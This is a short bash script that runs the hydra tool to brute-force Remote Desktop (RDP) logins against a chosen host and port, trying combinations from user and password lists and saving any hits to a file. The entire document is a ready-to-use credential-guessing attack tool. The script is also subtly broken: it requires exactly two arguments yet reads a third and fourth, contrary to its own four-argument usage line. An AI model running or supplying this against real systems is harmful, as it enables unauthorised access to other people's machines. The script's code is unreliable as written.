#!/bin/bash

if [ $# == 2 ]; then
	echo "Now getting RDP bruting: $1"
	hydra -v -L $3 -P $4 -s $2 -e nsr -f -t 2 -o "rdp_$1_$2_hydra.txt" rdp://$1
else
    echo "Illegal number of parameters"
    echo "USAGE: brute-force-rdp-hydra.sh <Target> <Port> <User List> <Password List>"
    exit 1
fi
